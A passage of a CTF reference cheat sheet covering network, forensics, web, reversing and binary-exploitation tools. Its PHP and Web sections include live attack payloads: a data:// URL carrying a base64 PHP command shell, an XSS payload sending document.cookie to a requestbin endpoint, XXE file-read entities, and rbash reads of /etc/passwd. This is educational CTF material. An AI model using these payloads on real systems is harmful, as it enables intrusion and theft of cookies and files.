	Not all tools like the [PCAPNG] file format... so you can convert them with an online tool [http://pcapng.com/](http://pcapng.com/) or from the command-line with the `editcap` command that comes with installing [Wireshark]:

```
editcap old_file.pcapng new_file.pcap
```

* [`tcpflow`][tcpflow]

	A command-line tool for reorganizing packets in a PCAP file and getting files out of them. __Typically it gives no output, but it creates the files in your current directory!__

```
tcpflow -r my_file.pcap
ls -1t | head -5 # see the last 5 recently modified files
```



* [PcapXray]

	A GUI tool to visualize network traffic.

PHP
------------

* Magic Hashes

	A common vulnerability in [PHP] that fakes hash "collisions..." where the `==` operator falls short in [PHP] type comparison, thinking everything that follows `0e` is considered scientific notation (and therefore 0). More valuable info can be found here: [https://github.com/spaze/hashes](https://github.com/spaze/hashes), but below are the most common breaks.

| Plaintext | MD5 Hash |
| --------- | -------- |
|240610708|0e462097431906509019562988736854|
|QLTHNDT|0e405967825401955372549139051580|
|QNKCDZO|0e830400451993494058024219903391|
|PJNPDWY|0e291529052894702774557631701704|
|NWWKITQ|0e763082070976038347657360817689|
|NOOPCJF|0e818888003657176127862245791911|
|MMHUWUV|0e701732711630150438129209816536|
|MAUXXQC|0e478478466848439040434801845361|
|IHKFRNS|0e256160682445802696926137988570|
|GZECLQZ|0e537612333747236407713628225676|
|GGHMVOE|0e362766013028313274586933780773|
|GEGHBXL|0e248776895502908863709684713578|
|EEIZDOI|0e782601363539291779881938479162|
|DYAXWCA|0e424759758842488633464374063001|
|DQWRASX|0e742373665639232907775599582643|
|BRTKUJZ|00e57640477961333848717747276704|
|ABJIHVY|0e755264355178451322893275696586|
|aaaXXAYW|0e540853622400160407992788832284|
|aabg7XSs|0e087386482136013740957780965295|
|aabC9RqS|0e041022518165728065344349536299|
|0e215962017|0e291242476940776845150308577824|

| Plaintext | SHA1 Hash |
| --------- | --------- |
|aaroZmOk|0e66507019969427134894567494305185566735|
|aaK1STfY|0e76658526655756207688271159624026011393|
|aaO8zKZF|0e89257456677279068558073954252716165668|
|aa3OFF9m|0e36977786278517984959260394024281014729|

| Plaintext | MD4 Hash |
| --------- | --------- |
|bhhkktQZ|0e949030067204812898914975918567|
|0e001233333333333334557778889|0e434041524824285414215559233446|
|0e00000111222333333666788888889|0e641853458593358523155449768529|
|0001235666666688888888888|0e832225036643258141969031181899|


* `preg_replace`

	A bug in older versions of [PHP] where the user could get remote code execution

	[http://php.net/manual/en/function.preg-replace.php](http://php.net/manual/en/function.preg-replace.php)


* [`phpdc.phpr`][phpdc.phpr]

	A command-line tool to decode [`bcompiler`][bcompiler] compiled [PHP] code.


* [`php://filter` for Local File Inclusion](https://www.idontplaydarts.com/2011/02/using-php-filter-for-local-file-inclusion/)

	A bug in [PHP] where if GET HTTP variables in the URL are controlling the navigation of the web page, perhaps the source code is `include`-ing other files to be served to the user. This can be manipulated by using [PHP filters](http://php.net/manual/en/filters.php) to potentially retrieve source code. Example like so:

```
http://xqi.cc/index.php?m=php://filter/convert.base64-encode/resource=index
```


* `data://text/plain;base64`

	A [PHP] stream that can be taken advantage of if used and evaluated as an `include` resource or evaluated. Can be used for RCE: check out this writeup: [https://ctftime.org/writeup/8868](https://ctftime.org/writeup/8868) ... TL;DR:

```
http://103.5.112.91:1234/?cmd=whoami&page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbJ2NtZCddKTsgPz4=
```


PDF Files
-------------

* `pdfinfo`

	A command-line tool to get a basic synopsis of what the [PDF] file is.

* `pdfcrack`

	A comand-line tool to __recover a password from a PDF file.__ Supports dictionary wordlists and bruteforce.

* `pdfimages`

	A command-line tool, the first thing to reach for when given a PDF file. It extracts the images stored in a PDF file, but it needs the name of an output directory (that it will create for) to place the found images.

* [`pdfdetach`][pdfdetach]

	A command-line tool to extract files out of a [PDF].

Forensics
-----------

* Python bytecode `uncompyle6`

	To decompile bytecode, use `uncompyle6`. There is one special argument (I think `-d` or something???) that can have success if the default operation does not work. Do not give up hope when working with obvious Python bytecode. EasyPythonDecompiler might work, or perhaps testing with `uncompyle`

* Keepass

	`keepassx` can be installed on Ubuntu to open and explore Keepass databases. Keepass databases master passwords can be cracked with `keepass2john`.

* [Magic Numbers]

	The starting values that identify a file format. These are often crucial for programs to properly read a certain file type, so they must be correct. If some files are acting strangely, try verifying their [magic number] with a [trusted list of file signatures](https://en.wikipedia.org/wiki/List_of_file_signatures).

* [`hexed.it`][hexed.it]

	An online tool that allows you to modify the hexadecimal and binary values of an uploaded file. This is a good tool for correcting files with a corrupt [magic number]

* [`dumpzilla`][dumpzilla]

	A [Python] script to examine a `.mozilla` configuration file, to examine downloads, bookmarks, history or bookmarks and registered passwords. Usage may be as such:

```
python dumpzilla.py .mozilla/firefox/c3a958fk.default/ --Downloads --History --Bookmarks --Passwords
```


* Repair image online tool

    Good low-hanging fruit to throw any image at: [https://online.officerecovery.com/pixrecovery/](https://online.officerecovery.com/pixrecovery/)


* `foremost`

	A command-line tool to carve files out of another file. Usage is `foremost [filename]` and it will create an `output` directory.

```
sudo apt install foremost
```

* `binwalk`

	A command-line tool to carve files out of another file. Usage to extract is `binwalk -e [filename]` and it will create a `_[filename]_extracted` directory.

```
	sudo apt install binwalk
```


* [`hachoir-subfile`][hachoir-subfile]

	A command-line tool to carve out files of another file. Very similar to the other tools like `binwalk` and `foremost`, but always try everything!


* [TestDisk]

	A command-line tool, used to recover deleted files from a file system image. Handy to use if given a `.dd` and `.img` file etc.

* [photorec]

	Another command-line utility that comes with `testdisk`. It is file data recovery software designed to recover lost files including video, documents and archives from hard disks, CD-ROMs, and lost pictures (thus the Photo Recovery name) from digital camera memory. PhotoRec ignores the file system and goes after the underlying data, so it will still work even if your media's file system has been severely damaged or reformatted.

* [Analysis Image] ['https://29a.ch/photo-forensics/#forensic-magnifier']

	Forensically is free online tool to analysis image this tool has many features like  Magnifier, Clone Detection, Error Level analysis, Noise Analusis, level Sweep, Meta Data, Geo tags, Thumbnail Analysis , JPEG Analysis, Strings Extraction.




PNG File Forensics
--------------------


* `pngcheck`

	A command-line tool for "checking" a [PNG] image file. Especially good for verifying checksums.


* [`pngcsum`](http://www.schaik.com/png/pngcsum/pngcsum-v01.tar.gz)

	Correct the CRC on all of the parts of a [PNG] image file.


* [https://github.com/sherlly/PCRT](https://github.com/sherlly/PCRT)

	Utility to try and correct a [PNG] file. **NOTE... this will NOT SAVE your file as new one. YOU HAVE TO SHOW the file (enter y when using the script]) to actually view the new image.**


APK Forensics
---------------

* [`apktool`][apktool]

	A command-line tool to extract all the resources from an APK file. Usage:

```
apktool d <file.apk>
```


* [`dex2jar`][dex2jar]

	A command-line tool to convert a J.dex file to .class file and zip them as JAR files.


* [`jd-gui`][jd-gui]

	A GUI tool to decompile Java code, and JAR files.


Web
----------------

* `robots.txt`

	This file tries to hide webpages from web crawlers, like Google or Bing or Yahoo. A lot of sites try and use this mask sensitive files or folders, so it should always be some where you check during a CTF. [http://www.robotstxt.org/](http://www.robotstxt.org/)

* [Edit This Cookie]

	A web browser plug-in that offers an easy interface to modifying [cookies]. ___THIS IS OFTEN OVERLOOKED, WITHOUT CHANGING THE VALUE OF THE COOKIES... BE SURE TO FUZZ EVERYTHING, INCLUDING COOKIE VALUES!___

* Backup pages ( `~` and `.bak` and `.swp` )

	Some times you may be able to dig up an old version of a webpage (or some PHP source code!) by adding the usual backup suffixes. A good thing to check!

* `/admin/`

	This directory is often found by directory scanning bruteforce tools, so I recommend just checking the directory on your own, as part of your own "low-hanging fruits" check.

* `/.git/`

	A classic CTF challenge is to leave a `git` repository live and available on a website. You can see this with `nmap -A` (or whatever specific script catches it) and just by trying to view that specific folder, `/.git/`. A good command-line tool for this is [`GitDumper.sh`](https://github.com/internetwache/GitTools), or just simply using [`wget`][wget].

	**Sometimes you might Bazaar or Mercurial or other distributed version control systems. You can use [https://github.com/kost/dvcs-ripper](https://github.com/kost/dvcs-ripper) for those!!**

* [`GitDumper.sh`][GitDumper.sh]

	A command-line tool that will automatically scrape and download a [git] repository hosted online with a given URL.

* Bazaar `.bzr`

	If you see a publically accessible `.bzr` directory, you can use `bzr branch http://site output-directory` to download it. Or, use this utility: [https://github.com/kost/dvcs-ripper](https://github.com/kost/dvcs-ripper)

* [XSS]/[Cross-site scripting]

	[XSS Filter Evasion Cheat Sheet](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet). [Cross-site scripting], vulnerability where the user can control rendered [HTML] and ideally inject [JavaScript] code that could drive a browser to any other website or make any malicious network calls. Example test payload is as follows:


```
<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>
```

	Typically you use this to steal cookies or other information, and you can do this with an online requestbin.

```
<img src="#" onerror="document.location='http://requestbin.fullcontact.com/168r30u1?c' + document.cookie">
```
* new usefull XSS cheat sheet : 'https://portswigger.net/web-security/cross-site-scripting/cheat-sheet'
* [CloudFlare Bypass](https://github.com/Anorov/cloudflare-scrape)

	If you need to script or automate against a page that uses the I'm Under Attack Mode from CloudFlare, or DDOS protection, you can do it like this with linked Python module.

``` python
#!/usr/bin/env python

import cfscrape

url = 'http://yashit.tech/tryharder/'

scraper = cfscrape.create_scraper()
print scraper.get(url).content
```

* [XSStrike]

	A command-line tool for automated [XSS] attacks. Seems to function like how [sqlmap] does.

* [`wpscan`][wpscan]

	* A Ruby script to scan and do reconnaissance on a [Wordpress] application.

* Mac AutoLogin Password Cracking

Sometimes, given an Mac autologin password file `/etc/kcpassword`, you can crack it with this code:

```
def kcpasswd(ciphertext):
    key = '7d895223d2bcddeaa3b91f'
    while len(key) < (len(ciphertext)*2):
        key = key + key
    key = binasciiunhexlify(key)
    result = ''
    for i in range(len(ciphertext)):
        result += chr(ord(ciphertext[i]) ^ (key[i]))
    return result
```
* XXE : XML External Entity

An XML External Entity attack is a type of attack against an application that parses XML input and allows XML entities. XML entities can be used to tell the XML parser to fetch specific content on the server.
We try to display the content of the file /flag :

```
<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data (#ANY)>
<!ENTITY file SYSTEM "file:///flag">
]>
<data>&file;</data>

<?xml version="1.0" encoding="UTF-16"?>
  <!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///flag" >]><foo>&xxe;</foo>

  ```
* Wordpress Password Hash Generator

	If you make it into a Wordpress database and can change passwords, reset the admin password to a new hash: [http://www.passwordtool.hu/wordpress-password-hash-generator-v3-v4](http://www.passwordtool.hu/wordpress-password-hash-generator-v3-v4). This will let you login to /wp-admin/ on the site.

* Cookie Catcher

* [`requestb.in`](https://requestb.in/)

	A free tool and online end-point that can be used to catch HTTP requests. Typically these are controlled and set by finding a [XSS] vulnerabilty.

* [`hookbin.com`](https://hookbin.com/)

	A free tool and online end-point that can be used to catch HTTP requests. Typically these are controlled and set by finding a [XSS] vulnerabilty.

* [`sqlmap`][sqlmap]

	A command-line tool written in [Python] to automatically detect and exploit vulnerable SQL injection points.

* Flask Template Injection

	Try `{{config}}` to leak out the secret key, or start to climb up the Python MRO to acheive code execution.

	[https://nvisium.com/resources/blog/2015/12/07/injecting-flask.html](https://nvisium.com/resources/blog/2015/12/07/injecting-flask.html), [https://nvisium.com/resources/blog/2016/03/09/exploring-ssti-in-flask-jinja2.html](https://nvisium.com/resources/blog/2016/03/09/exploring-ssti-in-flask-jinja2.html), [https://nvisium.com/resources/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii.html](https://nvisium.com/resources/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii.html)


* SQL `IF` statements

	These are handy for some injections and setting up some Blind SQL if you need to. Syntax is like `SELECT ( IF ( 1=1, "Condition successful!", "Condition errored!" ) )`

* Explicit SQL Injection



* Blind SQL Injection


* MongoDB

Get MongoDB properly installed:

```
sudo apt-key adv --keyserver hkp://keyserver.ubuntu.com:80 --recv 9DA31620334BD75D9DCB49F368818C72E52529D4
echo "deb [ arch=amd64,arm64 ] https://repo.mongodb.org/apt/ubuntu xenial/mongodb-org/4.0 multiverse" | sudo tee /etc/apt/sources.list.d/mongodb-org-4.0.list
sudo apt-get update
sudo apt-get install -y mongodb-org
```

Connect to a remote server with credentials:

```
mongo --username 'uname' -p 'pword' --host hostname.com:27017
```

Print out the database info:

```
show databases

use <databasename>

show collections

c = db.<collectioname>

c.find()

```

* gobuster



* DirBuster

* `nikto`


* Burpsuite


* AWS / S3 Buckets

	You can try and dump an AWS bucket like so. The `--no-sign-request` avoids the need for credentials, and `--recursive` will grab everything possible.

```
aws s3 cp --recursive --no-sign-request s3://<bucket_name> .
```
	i. e. `aws s3 cp --recursive --no-sign-request s3://tamuctf .`


Reverse Engineering
-------------------

* [ltrace](http://man7.org/linux/man-pages/man1/ltrace.1.html) and [strace](https://strace.io)

	Easy command-line tools to see some of the code being executed as you follow through a binary. Usage: `ltrace ./binary`

* [Hopper](https://www.hopperapp.com)

	Hopper Disassembler, the reverse engineering tool that lets you disassemble, decompile and debug your applications.

* [Binary Ninja](https://binary.ninja)

	Clean and easy with multithreaded analysis. Support multiple architectures, platforms, and compilers.

* [gdb](https://en.wikipedia.org/wiki/GNU_Debugger)

	Fast and powerful debugger for UNIX system. More powerful if this tool is equipped with [PEDA](https://github.com/longld/peda).

* [IDA](https://www.hex-rays.com/products/ida/support/download.shtml)

	It's one of popular debugger and disassembler tool with rich of features, cross platform, multi-processor disassembler.

* [radare2](https://github.com/radareorg/radare2)

	Portable tool for hex editor, binary analysis, disassembler, debugger, etc.

* [Ghidra](https://ghidra-sre.org/)

	New RE tool developed by NSA with the same feature as IDA

* Compiling & running ASM code:

	You can convert ASM functions from assembly and run them as C functions like the following:

	`asm4.S`
	```asm
	.intel_syntax noprefix
	.global asm4
	asm4:
		push   ebp
		mov    ebp,esp
		push   ebx
		sub    esp,0x10
		mov    DWORD PTR [ebp-0x10],0x27d
		mov    DWORD PTR [ebp-0xc],0x0
		jmp    label2
	label1:
		add    DWORD PTR [ebp-0xc],0x1
	label2:
		mov    edx,DWORD PTR [ebp-0xc]
		mov    eax,DWORD PTR [ebp+0x8]
		add    eax,edx
		movzx  eax,BYTE PTR [eax]
		test   al,al
		jne    label1
		mov    DWORD PTR [ebp-0x8],0x1
		jmp    label3
	label4:
		mov    edx,DWORD PTR [ebp-0x8]
		mov    eax,DWORD PTR [ebp+0x8]
		add    eax,edx
		movzx  eax,BYTE PTR [eax]
		movsx  edx,al
		mov    eax,DWORD PTR [ebp-0x8]
		lea    ecx,[eax-0x1]
		mov    eax,DWORD PTR [ebp+0x8]
		add    eax,ecx
		movzx  eax,BYTE PTR [eax]
		movsx  eax,al
		sub    edx,eax
		mov    eax,edx
		mov    edx,eax
		mov    eax,DWORD PTR [ebp-0x10]
		lea    ebx,[edx+eax*1]
		mov    eax,DWORD PTR [ebp-0x8]
		lea    edx,[eax+0x1]
		mov    eax,DWORD PTR [ebp+0x8]
		add    eax,edx
		movzx  eax,BYTE PTR [eax]
		movsx  edx,al
		mov    ecx,DWORD PTR [ebp-0x8]
		mov    eax,DWORD PTR [ebp+0x8]
		add    eax,ecx
		movzx  eax,BYTE PTR [eax]
		movsx  eax,al
		sub    edx,eax
		mov    eax,edx
		add    eax,ebx
		mov    DWORD PTR [ebp-0x10],eax
		add    DWORD PTR [ebp-0x8],0x1
	label3:
		mov    eax,DWORD PTR [ebp-0xc]
		sub    eax,0x1
		cmp    DWORD PTR [ebp-0x8],eax
		jl     label4
		mov    eax,DWORD PTR [ebp-0x10]
		add    esp,0x10
		pop    ebx
		pop    ebp
		ret
	```

	`asm4.c`
	```c
	#include<stdio.h>
	extern int asm4(char* s);

	int main(){
	    char *str = "picoCTF_d899a";
	    printf("%X", asm4(str));
	    return 0;
	}
	```
	`bash`
	```bash
	$ gcc -m32 -o a asm4.c asm4.S
	$ ./a
	```

PowerShell
-------------

* [nishang]

	A PowerShell suite of tools for pentesting. Has support for an ICMP reverse shell!

* [Empire]

	HUGE PowerShell library and tool to do a lot of post-exploitation.

* [Bypass AMSI Anti-Malware Scan Interface](https://0x00-0x00.github.io/research/2018/10/28/How-to-bypass-AMSI-and-Execute-ANY-malicious-powershell-code.html?mkt_tok=eyJpIjoiWTJGaU5qbGlaVFZsTXpVdyIsInQiOiJBSXdzQm5FMGY0S1BrTWlBcVBlZ3ErN2NcL1RNeGkwcnNSK3FZcGVvaUhFRVJiQUhVcmVIWko0aWdNNCtXcVRrcWtDRTMxRGlpM1wvQlIxVHZlU1RUNk5sRVJnQ1dUZEFVQ0JTRHk4ejNVQTBWK1Y3Um1EWHZYdGY5YWQ5V2hTZFVXIn0%3D)

	Great tool and guide for anti-virus evasion with PowerShell.


Windows Executables
-------------

* [`pefile`][pefile]

	A [Python] module that examines the headers in a Windows [PE (Portable Executable)][PE] file.

* [dnSpy]

	A [Windows] GUI tool to decompile and reverse engineer [.NET] binaries

* [PEiD][PEiD]

	A [Windows] tool to detect common packers, cryptors and compilers for [Windows][Windows] [PE][PE]

* jetBrains .NET decompiler

* AutoIT converter

	When debugging AutoIT programs, you may get a notification: "This is a compiled AutoIT script". Here is a good thing to use to decode them: [https://www.autoitscript.com/site/autoit/downloads/](https://www.autoitscript.com/site/autoit/downloads/)

Python Reversing
------------

* [Easy Python Decompiler](https://sourceforge.net/projects/easypythondecompiler/)

	A small `.exe` GUI application that will "decompile" [Python] bytecode, often seen in `.pyc` extension. The tool runs reliably on [Linux] with [Wine].

* [Pyinstaller Extractor](https://github.com/extremecoders-re/pyinstxtractor)

	PyInstaller Extractor is a Python script to extract the contents of a PyInstaller generated Windows executable file. The contents of the pyz file (usually pyc files) present inside the executable are also extracted. Usage is `python3 pyinstxtractor.py <filename>`. We can later decompile the bytecode in `.pyc` using [uncompyle6](https://github.com/No-Cellist-7780/ctf-katana#forensics)
	



Binary Exploitation/pwn
--------------

* Basic Stack Overflow

	Use `readelf -s <binary>` to get the location of a function to jump to -- overflow in Python, find offset with `dmesg`, and jump.

* `printf` vulnerability

	A C binary vulnerability, where `printf` is used with user-supplied input without any arguments. Hand-made code to exploit and overwrite functions: [https://pastebin.com/0r4WGn3D](https://pastebin.com/0r4WGn3D) and a video walkthrough explaining: [https://www.youtube.com/watch?v=t1LH9D5cuK4](https://www.youtube.com/watch?v=t1LH9D5cuK4)

* [`formatStringExploiter`][formatStringExploiter]

	A good [Python] module to streamline exploiting a [format string vulnerability]. THIS IS NOT ALWAYS A GOOD TACTIC...

* 64-bit Buffer Overflow

	64-bit buffer overflow challenges are often difficult because the null bytes get in the way of memory addresses (for the function you want to jump to, that you can usually find with `readelf -s`). But, check if whether or not the function address you need starts with the same hex values already on the stack (in `rsp`). Maybe you only have to write two or three bytes after the overflow, rather than the whole function address.



Miscellaneous
----------

* [Payload All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings)

	Super useful repo that has a payload for basically every sceario


* Punchcards(/Punch cards)

	Sometimes it sucks to do these manually, but you can here: [http://tyleregeto.com/article/punch-card-emulator](http://tyleregeto.com/article/punch-card-emulator)


* GameBoy ROMS

	You have options to run GameBoy ROMs... one is using VisualBoyAdvance, the oher is RetroArch (which is supposedly better):

```
# VisualBoyAdvance
sudo add-apt-repository universe
sudo apt install visualboyadvance

# RetroArch
sudo add-apt-repository ppa:libretro/stable && sudo apt-get update && sudo apt-get install -y retroarch* libretro-*
```


* References to DICE, or EFF

	If your challenges references "EFF" or includes dice in some way, or showcases numbers 1-6 of length 5, try [https://www.eff.org/dice](https://www.eff.org/dice). This could refer to a passphrase generated by dice rolls available here: [https://www.eff.org/files/2016/07/18/eff_large_wordlist.txt](https://www.eff.org/files/2016/07/18/eff_large_wordlist.txt)

* [Base64], [Base32], [Base85], [Base91]

```
Base64:
TWFuIGlzIGRpc3Rpbmd1aXNoZWQsIG5vdCBvbmx5IGJ5IGhpcyByZWFzb24sIGJ1dCBieSB0aGlz
IHNpbmd1bGFyIHBhc3Npb24gZnJvbSBvdGhlciBhbmltYWxzLCB3aGljaCBpcyBhIGx1c3Qgb2Yg
dGhlIG1pbmQsIHRoYXQgYnkgYSBwZXJzZXZlcmFuY2Ugb2YgZGVsaWdodCBpbiB0aGUgY29udGlu
dWVkIGFuZCBpbmRlZmF0aWdhYmxlIGdlbmVyYXRpb24gb2Yga25vd2xlZGdlLCBleGNlZWRzIHRo
ZSBzaG9ydCB2ZWhlbWVuY2Ugb2YgYW55IGNhcm5hbCBwbGVhc3VyZS4=
```

```
Base32
ORUGS4ZANFZSAYLOEBSXQYLNOBWGKIDPMYQGEYLTMUZTELRANF2CA2LTEB3GS43JMJWGKIDCPEQGY33UOMQG6ZRAMNQXA2LUMFWCA3DFOR2GK4TTEBQW4ZBANVXXEZJAMVYXKYLMOMQHG2LHNZZSAZTPOIQHAYLEMRUW4ZZMEBSXQ5DSME======
```

```
Base85:
<~9jqo^BlbD-BleB1DJ+*+F(f,q/0JhKF<GL>Cj@.4Gp$d7F!,L7@<6@)/0JDEF<G%<+EV:2F!,
O<DJ+*.@<*K0@<6L(Df-\0Ec5e;DffZ(EZee.Bl.9pF"AGXBPCsi+DGm>@3BB/F*&OCAfu2/AKY
i(DIb:@FD,*)+C]U=@3BN#EcYf8ATD3s@q?d$AftVqCh[NqF<G:8+EV:.+Cf>-FD5W8ARlolDIa
l(DId<j@<?3r@:F%a+D58'ATD4$Bl@l3De:,-DJs`8ARoFb/0JMK@qB4^F!,R<AKZ&-DfTqBG%G
>uD.RTpAKYo'+CT/5+Cei#DII?(E,9)oF*2M7/c~>
```

```
Base91:
8D$J`/wC4!c.hQ;mT8,<p/&Y/H@$]xlL3oDg<W.0$FW6GFMo_D8=8=}AMf][|LfVd/<P1o/1Z2(.I+LR6tQQ0o1a/2/WtN3$3t[x&k)zgZ5=p;LRe.{B[pqa(I.WRT%yxtB92oZB,2,Wzv;Rr#N.cju"JFXiZBMf<WMC&$@+e95p)z01_*UCxT0t88Km=UQJ;WH[#F]4pE>i3o(g7=$e7R2u>xjLxoefB.6Yy#~uex8jEU_1e,MIr%!&=EHnLBn2h>M+;Rl3qxcL5)Wfc,HT$F]4pEsofrFK;W&eh#=#},|iKB,2,W]@fVlx,a<m;i=CY<=Hb%}+},F
```


* [Base65535](https://github.com/qntm/base65536)


	Unicode characters encoding. Includes a lot of seemingly random spaces and chinese characters!

```
§áÉ¢äª§ÑªÂ∂ú§Ñã§áÅ°äª§Ñõ§Ü¨†≤ª§Üª†Üú¢Æª§ÜªÍäå¢™ª§ÜªÈÇå§Üª§äª§Öã§≤•£æª§Ñã•Ü∏£äª§ÖõÍäå§Üª§Ü±ÁÇºÁ∂ª§ãÖ§Ö¥Ëñπ£™ª£äª£Ωª§áÜ§ö¢£∫ªËµà§á£Á∂π§ªà§á£§æ∫§áÉÊÇ∫¢¶ª§Çª§Ö†„¢π£æª§Ñõ§Üì§¶π§äª§Ñ∞ÁÇúÂÇº§ûª¢äª£≤ª£∫ªÍâåÈÇπ°äª£π´§Öã§áÖ£æª§áÑìéú†öª§äª¢äª§âõ§Ö´§Çë§ÉÉ°âå§µõ£πõ§Åê¢âã°âª°°´§á††ûó§á°°äÑ°íå£ºªÁáâ£ºã¶ÑòÁÇ∏ÈÇπ„¢∏†ûª†¶ª°äª£àª°àª£àõ°àõÍä∫†Üº§ÇÖ£ªÜ£´É§Æ∫§äª°âã„Ωª£∫¨£àõ°àã§≠ª§Ç≤£àª§≠ª§äº¢àõÂÑõ°àõ·î∫
```

* [Base41](https://github.com/sveljko/base41/blob/master/python/base41.py)

* Mac / Macintosh / Apple Hidden Files `.DS_Store` [ds_store_exp](https://github.com/lijiejie/ds_store_exp)

	On Mac computers, there is a hidden index file `.DS_Store`. You might be able to find it if you have an LFI vulnerability or something of the like. A good tool to track these down on a website is the DS_Store Exposer: [https://github.com/lijiejie/ds_store_exp](https://github.com/lijiejie/ds_store_exp).




* Wordsearches

	Some CTFs have me solve wordsearchs as part of a challenge (TJCTF 2018). This code is super helpful: [https://github.com/robbiebarrat/word-search](https://github.com/robbiebarrat/word-search)

* "Unflattening" Base64 in lowercase or uppercase

	Some time ago we needed to recover the original Base64 string from one that is in all lowercase or all uppercase. Caleb wrote a good script to smartly do this: [https://pastebin.com/HprZcHrY](https://pastebin.com/HprZcHrY)


* Password-protected Zip Files:  [`fcrackzip`][fcrackzip] and `zip2john.py`

	Use

* 15 Puzzle

	A sliding puzzle that consists of a 4x4 grid with numbered square tiles, with one missing, set in a random order. It was involved in SharifCTF to determine if a group of these puzzles was solvable: [https://theromanxpl0it.github.io/ctf_sharifctf18/fifteenpuzzle/](https://theromanxpl0it.github.io/ctf_sharifctf18/fifteenpuzzle/)


* SETUID Binary Methodology

	Don't forget to check "simple" things --- it doesn't need to be a pwn or binary exploitation challenge, keep in mind IT DOES NOT use a secure PATH like `sudo`.

* Chrome Password Dump

	A [Windows] command-line tool to dump passwords saved with Google Chrome.
	[http://securityxploded.com/chrome-password-dump.php](http://securityxploded.com/chrome-password-dump.php)

* `img2txt`

	A command-line tool to convert an image into ASCII for the terminal. Can be installed like so:

```
sudo apt install -y caca-utils
```


* Strange Symbols/Characters

	Some CTFs will try and hide a message on a picture with strange symbols. Try and Google Reverse Image searching these. They may be Egyptian Characters:

![http://www.virtual-egypt.com/newhtml/hieroglyphics/sample/alphabet.gif](http://www.virtual-egypt.com/newhtml/hieroglyphics/sample/alphabet.gif)



* Bitcoin

	You might see a private Bitcoin key as a base64 encoded SHA256 hash, like this:

```
NWEyYTk5ZDNiYWEwN2JmYmQwOGI5NjEyMDVkY2FlODg3ZmIwYWNmOWYyNzI5MjliYWE3OTExZmFhNGFlNzc1MQ==
```

	Decoded, it is a hash: `5a2a99d3baa07bfbd08b961205dcae887fb0acf9f272929baa7911faa4ae7751`.

	If you can find an AES ECB key along with (usually represented in hex or another encoding), you can decipher like so:

```
openssl enc -d -aes-256-ecb -in <(printf %s '5a2a99d3baa07bfbd08b961205dcae887fb0acf9f272929baa7911faa4ae7751' | xxd -r -p) -K '6fb3b5b05966fb06518ce6706ec933e79cfaea8f12b4485cba56321c7a62a077'
MCA{I$love$bitcoin$so$much!}
```

* Missing `ls` or `dir` commands

	If you cannot run `ls` or `dir`, or `find` or `grep`, to list files you can use

```
echo *
echo /any/path/*
```


* restricted bash (`rbash`) read files

	If you are a restricted shell like `rbash` you can still read any file with some builtin commands like `mapfile`:

```
mapfile -t  < /etc/passwd
printf "$s\n" "${anything[@]}"
```

Jail Breaks
----------
Sometimes you're jailed in an environment where you can potentially execute code.
* Python 3
`().__class__.__base__.__subclasses__()` - Gives access to `object` subclasses


Trivia
-------------

* Trivia Question: a reliable mechanism for websites to remember stateful information. Yummy!

```
Cookie
```

* A group of binary-to-text encoding schemes that represent binary data in an ASCII string format by translating it into a radix-64 representation

```
base64
```

* This CVE Proof of concept Shows NSA.gov playing "Never Gonna Give You Up," by 1980s heart-throb Rick Astley.

```
CVE-2020-0601
```

* The British used this machine to crack the German Enigma machine messages.

```
Bombe
```

* What is the Windows LM hash for a blank password?

```
aad3b435b51404eeaad3b435b51404ee
```

* for Windows LM hashing, after the password is split into two 7 character chunks, they are used as DES keys to encrypt what string?

```
KGS!@#$%
```

* I am the person responsible for stopping one of the worst ransomware. Who am I?

```
MalwareTech
```

* I am used by devices for sending error messages. Who am I?

```
ICMP
```


*  We are a CTF team which is open to everybody. Who are we?


```
OpenToAll - https://opentoallctf.github.io/
```


[steghide]: http://steghide.sourceforge.net/
[snow]: http://www.darkside.com.au/snow/
[cribdrag.py]: https://github.com/SpiderLabs/cribdrag
[cribdrag]: https://github.com/SpiderLabs/cribdrag
[pcap]: https://en.wikipedia.org/wiki/Pcap
[PCAP]: https://en.wikipedia.org/wiki/Pcap
[Wireshark]: https://www.wireshark.org/
[Network Miner]: http://www.netresec.com/?page=NetworkMiner
[PCAPNG]: https://github.com/pcapng/pcapng
[pcapng]: https://github.com/pcapng/pcapng
[pdfcrack]: http://pdfcrack.sourceforge.net/index.html
[GitDumper.sh]: https://github.com/internetwache/GitTools
[pefile]: https://github.com/erocarrera/pefile
[Python]: https://www.python.org/
[PE]: https://en.wikipedia.org/wiki/Portable_Executable
[Portable Executable]: https://en.wikipedia.org/wiki/Portable_Executable
[hipshot]: https://bitbucket.org/eliteraspberries/hipshot
[QR code]: https://en.wikipedia.org/wiki/QR_code
[QR codes]: https://en.wikipedia.org/wiki/QR_code
[QR]: https://en.wikipedia.org/wiki/QR_code
[zbarimg]: https://linux.die.net/man/1/zbarimg
[Linux]: https://en.wikipedia.org/wiki/Linux
[Ubuntu]: https://en.wikipedia.org/wiki/Ubuntu_(operating_system)
[Wine]: https://en.wikipedia.org/wiki/Wine_(software)
[Detect DTMF Tones]: http://dialabc.com/sound/detect/index.html
[dnSpy]: https://github.com/0xd4d/dnSpy
[Windows]: https://en.wikipedia.org/wiki/Microsoft_Windows
[.NET]: https://en.wikipedia.org/wiki/.NET_Framework
[Vigenere Cipher]: https://en.wikipedia.org/wiki/Vigen%C3%A8re_cipher
[PDF]: https://en.wikipedia.org/wiki/Portable_Document_Format
[Playfair Cipher]: https://en.wikipedia.org/wiki/Playfair_cipher
[phpdc.phpr]:https://github.com/lighttpd/xcache/blob/master/bin/phpdc.phpr
[bcompiler]: http://php.net/manual/en/book.bcompiler.php
[PHP]: https://en.wikipedia.org/wiki/PHP
[GET]: https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol#Request_methods
[pdfdetach]: https://www.systutorials.com/docs/linux/man/1-pdfdetach/
[sqlmap]: https://github.com/sqlmapproject/sqlmap
[hachoir-subfile]: https://pypi.python.org/pypi/hachoir-subfile/0.5.3
[wget]: https://en.wikipedia.org/wiki/Wget
[git]: https://git-scm.com/
[Cross-site scripting]: https://en.wikipedia.org/wiki/Cross-site_scripting
